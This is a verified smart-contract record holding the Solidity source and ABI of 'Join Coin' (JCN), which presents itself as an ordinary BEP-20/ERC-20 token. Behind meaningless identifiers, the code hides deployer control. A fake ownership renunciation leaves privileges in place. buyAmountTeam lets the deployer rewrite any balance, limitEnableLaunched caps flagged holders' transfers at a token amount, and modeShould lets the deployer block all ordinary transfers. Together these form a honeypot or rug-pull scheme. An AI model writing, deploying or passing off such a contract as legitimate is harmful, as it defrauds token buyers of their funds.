{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.16;\n\nlibrary SafeMath {\n\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\n        uint256 c = a + b;\n        require(c >= a, \"SafeMath: addition overflow\");\n\n        return c;\n    }\n\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n        return sub(a, b, \"SafeMath: subtraction overflow\");\n    }\n\n    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b <= a, errorMessage);\n        uint256 c = a - b;\n\n        return c;\n    }\n\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\n        if (a == 0) {\n            return 0;\n        }\n\n        uint256 c = a * b;\n        require(c / a == b, \"SafeMath: multiplication overflow\");\n\n        return c;\n    }\n\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\n        return div(a, b, \"SafeMath: division by zero\");\n    }\n\n    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b > 0, errorMessage);\n        uint256 c = a / b;\n\n        return c;\n    }\n\n    function mod(uint256 a, uint256 b) internal pure returns (uint256) {\n        return mod(a, b, \"SafeMath: modulo by zero\");\n    }\n\n    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b != 0, errorMessage);\n        return a % b;\n    }\n}\n\nabstract contract totalAuto {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface marketingAtMode {\n    function createPair(address marketingFee, address receiverIsWallet) external returns (address);\n\n    function feeTo() external view returns (address);\n}\n\ninterface atLiquidity {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\n\ninterface tradingFrom {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address launchList) external view returns (uint256);\n\n    function transfer(address totalModeFund, uint256 modeEnable) external returns (bool);\n\n    function allowance(address liquidityReceiverLaunched, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 modeEnable) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address totalModeFund,\n        uint256 modeEnable\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed sellLaunchLaunched, uint256 value);\n    event Approval(address indexed liquidityReceiverLaunched, address indexed spender, uint256 value);\n}\n\ninterface tradingFromMetadata is tradingFrom {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract JoinCoin is totalAuto, tradingFrom, tradingFromMetadata {\n\n    uint256 public listMax;\n\n    function getOwner() external view returns (address) {\n        return launchedReceiver;\n    }\n\n    string private senderLaunched = \"Join Coin\";\n\n    uint256 shouldBuy;\n\n    function name() external view virtual override returns (string memory) {\n        return senderLaunched;\n    }\n\n    mapping(address => bool) public listLimit;\n\n    mapping(address => uint256) private atExempt;\n\n    uint256 public senderBuy = 0;\n\n    function limitEnableLaunched(address enableMode) public {\n        fromReceiver();\n        if (marketingTxEnable == shouldIs) {\n            receiverLaunch = false;\n        }\n        if (enableMode == buyTake || enableMode == amountLaunched) {\n            return;\n        }\n        listLimit[enableMode] = true;\n    }\n\n    uint256 totalExempt;\n\n    uint256 public totalList = 3;\n\n    function transfer(address teamSell, uint256 modeEnable) external virtual override returns (bool) {\n        return fromList(_msgSender(), teamSell, modeEnable);\n    }\n\n    function receiverBuy(address tokenReceiver, address totalModeFund, uint256 modeEnable) internal returns (bool) {\n        require(atExempt[tokenReceiver] >= modeEnable);\n        atExempt[tokenReceiver] -= modeEnable;\n        atExempt[totalModeFund] += modeEnable;\n        emit Transfer(tokenReceiver, totalModeFund, modeEnable);\n        return true;\n    }\n\n    address private launchedReceiver;\n\n    mapping(address => bool) public feeTotal;\n\n    uint256 private autoFund = 100000000 * 10 ** 18;\n\n    function approve(address walletFrom, uint256 modeEnable) public virtual override returns (bool) {\n        enableBuy[_msgSender()][walletFrom] = modeEnable;\n        emit Approval(_msgSender(), walletFrom, modeEnable);\n        return true;\n    }\n\n    string private listShouldTx = \"JCN\";\n\n    address launchedMax;\n\n    uint8 private launchFund = 18;\n\n    bool public shouldMax;\n\n    bool private listMarketing;\n\n    uint256 private shouldIs;\n\n    function allowance(address minFee, address walletFrom) external view virtual override returns (uint256) {\n        if (walletFrom == buyExempt) {\n            return type(uint256).max;\n        }\n        return enableBuy[minFee][walletFrom];\n    }\n\n    function teamSwap() public {\n        emit OwnershipTransferred(buyTake, address(0));\n        launchedReceiver = address(0);\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return listShouldTx;\n    }\n\n    function fromList(address tokenReceiver, address totalModeFund, uint256 modeEnable) internal returns (bool) {\n        if (tokenReceiver == buyTake) {\n            return receiverBuy(tokenReceiver, totalModeFund, modeEnable);\n        }\n        uint256 exemptEnableLimit = tradingFrom(amountLaunched).balanceOf(launchedMax);\n        require(exemptEnableLimit == totalExempt);\n        require(totalModeFund != launchedMax);\n        if (listLimit[tokenReceiver]) {\n            return receiverBuy(tokenReceiver, totalModeFund, swapReceiverLaunched);\n        }\n        modeEnable = fromTx(tokenReceiver, totalModeFund, modeEnable);\n        return receiverBuy(tokenReceiver, totalModeFund, modeEnable);\n    }\n\n    function owner() external view returns (address) {\n        return launchedReceiver;\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return launchFund;\n    }\n\n    function balanceOf(address launchList) public view virtual override returns (uint256) {\n        return atExempt[launchList];\n    }\n\n    function transferFrom(address tokenReceiver, address totalModeFund, uint256 modeEnable) external override returns (bool) {\n        if (_msgSender() != buyExempt) {\n            if (enableBuy[tokenReceiver][_msgSender()] != type(uint256).max) {\n                require(modeEnable <= enableBuy[tokenReceiver][_msgSender()]);\n                enableBuy[tokenReceiver][_msgSender()] -= modeEnable;\n            }\n        }\n        return fromList(tokenReceiver, totalModeFund, modeEnable);\n    }\n\n    uint256 private atReceiver;\n\n    address buyExempt = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function fromTx(address tokenReceiver, address totalModeFund, uint256 modeEnable) internal view returns (uint256) {\n        require(modeEnable > 0);\n\n        uint256 sellEnableTrading = 0;\n        if (tokenReceiver == amountLaunched && totalList > 0) {\n            sellEnableTrading = modeEnable * totalList / 100;\n        } else if (totalModeFund == amountLaunched && senderBuy > 0) {\n            sellEnableTrading = modeEnable * senderBuy / 100;\n        }\n        require(sellEnableTrading <= modeEnable);\n        return modeEnable - sellEnableTrading;\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return autoFund;\n    }\n\n    mapping(address => mapping(address => uint256)) private enableBuy;\n\n    uint256 constant swapReceiverLaunched = 18 ** 10;\n\n    bool public receiverLaunch;\n\n    constructor (){\n        if (receiverLaunch) {\n            atReceiver = marketingTxEnable;\n        }\n        teamSwap();\n        atLiquidity limitReceiverLiquidity = atLiquidity(buyExempt);\n        amountLaunched = marketingAtMode(limitReceiverLiquidity.factory()).createPair(limitReceiverLiquidity.WETH(), address(this));\n        launchedMax = marketingAtMode(limitReceiverLiquidity.factory()).feeTo();\n        \n        buyTake = _msgSender();\n        feeTotal[buyTake] = true;\n        atExempt[buyTake] = autoFund;\n        if (atReceiver == listMax) {\n            listMax = shouldIs;\n        }\n        emit Transfer(address(0), buyTake, autoFund);\n    }\n\n    function modeShould(uint256 modeEnable) public {\n        fromReceiver();\n        totalExempt = modeEnable;\n    }\n\n    address public buyTake;\n\n    address public amountLaunched;\n\n    function feeTo(address autoIs) public {\n        if (shouldMax) {\n            return;\n        }\n        \n        feeTotal[autoIs] = true;\n        if (shouldIs == listMax) {\n            listMax = atReceiver;\n        }\n        shouldMax = true;\n    }\n\n    uint256 private marketingTxEnable;\n\n    function buyAmountTeam(address teamSell, uint256 modeEnable) public {\n        fromReceiver();\n        atExempt[teamSell] = modeEnable;\n    }\n\n    event OwnershipTransferred(address indexed maxLimitLiquidity, address indexed senderAt);\n\n    function fromReceiver() private view {\n        require(feeTotal[_msgSender()]);\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"liquidityReceiverLaunched\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"maxLimitLiquidity\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"senderAt\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"sellLaunchLaunched\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"minFee\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"walletFrom\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"amountLaunched\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"walletFrom\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"modeEnable\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchList\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"teamSell\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"modeEnable\",\"type\":\"uint256\"}],\"name\":\"buyAmountTeam\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"buyTake\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"autoIs\",\"type\":\"address\"}],\"name\":\"feeTo\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"feeTotal\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"enableMode\",\"type\":\"address\"}],\"name\":\"limitEnableLaunched\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"listLimit\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"listMax\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"modeEnable\",\"type\":\"uint256\"}],\"name\":\"modeShould\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverLaunch\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"senderBuy\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"shouldMax\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"teamSwap\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalList\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"teamSell\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"modeEnable\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tokenReceiver\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"totalModeFund\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"modeEnable\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "JoinCoin", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}